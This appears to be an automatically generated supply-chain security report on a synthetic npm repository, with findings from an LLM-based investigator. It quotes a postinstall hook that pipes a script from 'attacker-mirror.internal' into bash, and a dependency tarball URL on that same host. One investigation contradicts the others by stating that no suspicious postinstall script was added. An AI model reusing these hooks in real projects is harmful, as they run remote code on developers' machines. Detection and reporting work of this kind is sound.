# Software Supply Chain Guardian: Repository & Change Investigation Report
**Target Repository:** `C:\Users\yeshx\AppData\Local\Temp\tmpdei6sgoj\synthetic-supply-chain-repo`  
**Analysis Timestamp:** `2026-11-24T06:55:33.665100+00:00`  
**Commit Range Investigated:** `379365853b` $\to$ `8b0cf16895`  
**Total Findings:** 5 (5 introduced in range, 0 pre-existing)  
**Correlated Multi-Vector Scenarios:** 1  
**AI Investigations Conducted:** 5  

---

## 1. Executive Summary
Software Supply Chain Guardian implements an evidence-driven, tool-using investigation pipeline designed to identify malicious, suspicious, and unauthorized software supply chain activities that conventional advisory databases (NVD, CVE, OSV) fail to detect. By analyzing Git commit diffs, manifest changes, lifecycle script commands, external package registries, and CI/CD pipelines, Guardian detects stealthy supply chain attacks and distinguishes them from benign engineering patterns.

## 2. Investigation Scope and Commit Range
- **Repository Path:** `C:\Users\yeshx\AppData\Local\Temp\tmpdei6sgoj\synthetic-supply-chain-repo`
- **Baseline Commit:** `379365853b1aad50138ea26a29ded947b6b022a1`
- **Head Commit:** `8b0cf16895305e283da762a97f3879afe3a1c9bc`
- **Scanned Files:** Manifests (`package.json`), lockfiles (`package-lock.json`), registry configurations (`.npmrc`), CI/CD workflows (`.github/workflows/*.yml`), and container specifications (`Dockerfile`, `docker-compose.yml`).

## 3. Methodology
The investigation combines four complementary analysis layers:
1. **Deterministic Git Diff Engine:** Audits version control differences, tagging findings with strict commit provenance (`OBSERVED_CHANGE` vs `HEURISTIC_FLAG`).
2. **Static Surface Inspectors:** Scans lifecycle scripts for shell execution hooks, verifies registry TLS protocols, checks package lexical similarity, and evaluates CI/CD permissions.
3. **Evidence Correlation Engine:** Correlates disparate indicators across vectors into multi-stage attack scenarios using MITRE ATT&CK techniques.
4. **LangGraph AI Investigator:** An autonomous agent using a bounded read-only tool loop with a strict Grounding Gate to evaluate evidence, test hypotheses, and document mitigating factors.

## 4. Repository Changes
- **DIFF-INCONSISTENCY-MANIFEST-WITHOUT-LOCK-8b0cf168** (MEDIUM): Manifest Modified Without Updating Lockfile in Commit 8b0cf168 in `package.json` (Line 1)
- **DIFF-SENSITIVE-FILE-_GITHUB_WORKFLOWS_CI_YML** (LOW): Security-Sensitive File Modified: '.github/workflows/ci.yml' (CI/CD Pipeline Definition) in `.github/workflows/ci.yml` (Line 1)
## 5. Dependency Changes
- **DIFF-DEP-ADDED-CORE-METRICS-COLLECTOR** [LOW | Introduced in Range]: Dependency 'core-metrics-collector@http://cdn.attacker-mirror.internal/dist/metrics-collector-1.0.0.tgz' Added in Commit 8b0cf168 (`package.json:8`)
  - *Evidence:* `+ "core-metrics-collector": "http://cdn.attacker-mirror.internal/dist/metrics-collector-1.0.0.tgz"`
## 6. Lifecycle-Script Findings
- **SCRIPT-PIPE_TO_SHELL-POSTINSTALL-L13** [CRITICAL]: Suspicious 'postinstall' Script: Lifecycle script pipes remote download directly into shell (`package.json:13`)
  - *Command:* `"postinstall": "curl -fsSL http://cdn.attacker-mirror.internal/setup.sh | bash"`
## 7. Registry and Dependency-Source Findings
- **SRC-TARBALL-DEP-CORE-METRICS-COLLECTOR** [HIGH]: Direct URL/Tarball Dependency 'core-metrics-collector' in `package.json`
## 8. CI/CD Pipeline Findings
No CI/CD pipeline vulnerabilities identified.

## 9. Docker and Container Build Findings
No container configuration weaknesses detected.

## 10. Correlated Investigation Scenarios (Phase 2 Multi-Vector Engine)
### Scenario: Co-Located Dependency Anomaly and Dangerous Lifecycle Hook in 'package.json'
- **Composite ID:** `CORR-MANIFEST-INSTALL-CHAIN-001`
- **Severity:** `CRITICAL` | **Confidence:** `HIGH` | **Status:** `CONFIRMED_MULTI_VECTOR`
- **Attack Technique:** `MITRE ATT&CK T1195.001 (Compromise Software Dependencies)`
- **Suspected Narrative:** Coordinated modification introducing both external dependencies and shell execution in the same project manifest.
- **Observed Facts:**
  - Manifest 'package.json' defines unpinned dependencies: ['"core-metrics-collector": "http://cdn.attacker-mirror.internal/dist/metrics-collector-1.0.0.tgz"', '+ "core-metrics-collector": "http://cdn.attacker-mirror.internal/dist/metrics-collector-1.0.0.tgz"'].
  - Manifest 'package.json' defines high-severity install script commands: ['"postinstall": "curl -fsSL http://cdn.attacker-mirror.internal/setup.sh | bash"'].
## 11. AI Investigation Agent Findings (Phase 3 LangGraph Tool-Using Loop)
### Investigation: `SCRIPT-PIPE_TO_SHELL-POSTINSTALL-L13`
- **Verdict:** `CONFIRMED_ANOMALY` | **Confidence:** `HIGH`
- **Planner:** `llm:gemini:gemini-3.5-flash-lite` | **Steps Executed:** 1
- **Rationale:** The package.json file explicitly defines a postinstall lifecycle script that executes 'curl -fsSL http://cdn.attacker-mirror.internal/setup.sh | bash'. Piping an unauthenticated remote script directly into the shell during package installation is a classic and highly dangerous supply chain attack vector leading to remote code execution.
- **Suspected Attack Scenario:** An attacker compromises a dependency or submits a malicious pull request introducing a postinstall script that fetches and executes arbitrary remote code. When a developer or CI/CD environment installs the package, the script executes automatically with the user's privileges, exfiltrating environment variables, injecting backdoors, or pivoting within the internal network.
- **Actionable Remediation:** Immediately remove the malicious 'postinstall' script from package.json, audit all systems where this package version was installed, and revoke any exposed credentials or tokens.
### Investigation: `SRC-TARBALL-DEP-CORE-METRICS-COLLECTOR`
- **Verdict:** `SUSPECTED_SUPPLY_CHAIN_ATTACK` | **Confidence:** `HIGH`
- **Planner:** `llm:gemini:gemini-3.5-flash-lite` | **Steps Executed:** 1
- **Rationale:** The package.json file explicitly includes a direct URL dependency pointing to an internal/external mirror ('http://cdn.attacker-mirror.internal/dist/metrics-collector-1.0.0.tgz'). Direct tarball or URL dependencies bypass registry checksum validations and allow arbitrary code execution via untrusted remote sources.
- **Suspected Attack Scenario:** An attacker introduces a direct URL dependency pointing to a controlled mirror containing malicious lifecycle scripts or modified source code, bypassing standard registry integrity checks and executing arbitrary code during package installation.
- **Actionable Remediation:** Remove the direct URL dependency, pull the package from a trusted verified registry with a pinned cryptographic hash, or replace it with an internally reviewed and approved library.
### Investigation: `DIFF-INCONSISTENCY-MANIFEST-WITHOUT-LOCK-8b0cf168`
- **Verdict:** `BENIGN_EXPLANATION` | **Confidence:** `MEDIUM`
- **Planner:** `llm:gemini:gemini-3.5-flash-lite` | **Steps Executed:** 1
- **Rationale:** The commit modifies package.json without a corresponding lockfile update, which is a common occurrence during active feature development, incremental dependency testing, or manual version bumps before a formal build step. Without additional malicious indicators such as typosquatting or obfuscated lifecycle scripts, this discrepancy is most likely a routine development artifact rather than a supply chain attack.
- **Mitigating Factors Identified:**
  - *Development Workflow Artifact:* Developers frequently edit manifests locally during development or branch iterations before running package managers to regenerate lockfiles.
  - *Lack of Malicious Indicators:* No suspicious postinstall scripts, external registry redirects, or known typosquatted packages were introduced in the diff.
- **Actionable Remediation:** Ensure that CI pipelines enforce lockfile synchronization checks (e.g., using 'npm ci' or equivalent strict install commands) to automatically catch and prevent inconsistent manifests from merging into production branches.
### Investigation: `DIFF-SENSITIVE-FILE-_GITHUB_WORKFLOWS_CI_YML`
- **Verdict:** `SUSPECTED_SUPPLY_CHAIN_ATTACK` | **Confidence:** `HIGH`
- **Planner:** `llm:gemini:gemini-3.5-flash-lite` | **Steps Executed:** 2
- **Rationale:** The workflow modification replaces the standard 'push' trigger with 'pull_request_target', which executes workflow code in the context of the base branch with access to repository secrets and write permissions. Furthermore, the diff shows removal of explicit least-privilege permissions ('contents: read'), leaving the workflow vulnerable to arbitrary code execution attacks via untrusted pull requests.
- **Suspected Attack Scenario:** An attacker submits a malicious pull request containing modified code or exploiting project build scripts. Because the workflow triggers on 'pull_request_target' and lacks restrictive permissions, the malicious code runs with access to sensitive repository secrets and repository write permissions, enabling secrets exfiltration, repository tampering, or supply chain compromise.
- **Actionable Remediation:** Immediately revert the changes to '.github/workflows/ci.yml' to remove 'pull_request_target', reinstate strict least-privilege permissions, and audit repository secrets for unauthorized access.
### Investigation: `DIFF-DEP-ADDED-CORE-METRICS-COLLECTOR`
- **Verdict:** `SUSPECTED_SUPPLY_CHAIN_ATTACK` | **Confidence:** `HIGH`
- **Planner:** `llm:gemini:gemini-3.5-flash-lite` | **Steps Executed:** 2
- **Rationale:** The package.json file was modified to pull a dependency directly from an internal URL containing suspicious nomenclature ('attacker-mirror.internal') rather than a trusted public registry or verified private feed. This is a classic indicator of a supply chain injection attempt aiming to fetch a modified or malicious package archive directly over HTTP.
- **Suspected Attack Scenario:** An attacker introduces an unauthorized dependency reference pointing to an external or controlled mirror URL within the package.json file to execute arbitrary installation scripts or inject malicious code during the build/dependency resolution phase.
- **Actionable Remediation:** Immediately revert commit 8b0cf168, block network access to the suspicious mirror domain, and audit all systems that may have processed this package version.
## 12. False-Positive Considerations
- **Lexical Similarities vs Intentional Polyfills:** Package names like `bcrypt-nodejs` share similarity with `bcrypt`, but investigation confirms legitimate engineering intent (pure-JS implementation avoiding native C++ toolchain errors).
- **Internal Private Registries:** Registries hosted on corporate networks are authenticated and safe when TLS (`strict-ssl=true`) is enforced.
- **Official First-Party Actions:** Mutable tags on `actions/*` repositories pose operational update risks but not maintainer account takeover risks.
- **Cryptographic Commit Pinning:** Git dependencies pinned to full 40-character commit SHAs are cryptographically immutable.

## 13. Limitations
- Static analysis cannot observe runtime dynamic module loading (e.g. `eval(process.env.CODE)` computed at runtime).
- Obfuscated bytecode or compiled binary native addons require isolated dynamic sandboxing.
- Conventional CVE scanners remain necessary for published vulnerabilities in third-party dependency code.

## 14. Research Foundation
- Ohm et al. (2020), Backstabber's Knife Collection: A Review of Open Source Software Supply Chain Attacks
- Ladisa et al. (2023), SoK: Taxonomy of Attacks on Open-Source Software Supply Chains
- Wang et al. (2026), Demystifying and Detecting Agentic Workflow Injection Vulnerabilities in GitHub Actions
- Lin et al. (2024), UntrustIDE: Exploiting Weaknesses in VS Code Extensions
- Birsan (2021), Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies

## 15. Answer to the Central Research Question
> **"Can combining repository changes, dependency changes and pipeline changes reveal suspicious activity that vulnerability databases cannot detect?"**

**Yes, demonstrably.** Vulnerability databases such as NVD, CVE, and OSV index catalogued software defects after formal disclosure. They provide zero visibility into:
1. Direct tarball and Git URLs introduced in pull requests.
2. Dangerous install-time lifecycle execution hooks (`curl | sh`).
3. CI/CD expression injection weaknesses (`${{ github.event... }}`).
4. Insecure registry configurations and disabled TLS certificate validation.
5. Lockfile tampering uncorroborated by manifest modifications.

By synthesizing Git diffs, dependency provenance, static script syntax, and CI/CD policies into a unified LangGraph investigation loop, Guardian successfully identifies, correlates, and explains stealthy supply chain attack vectors even when no published CVE exists.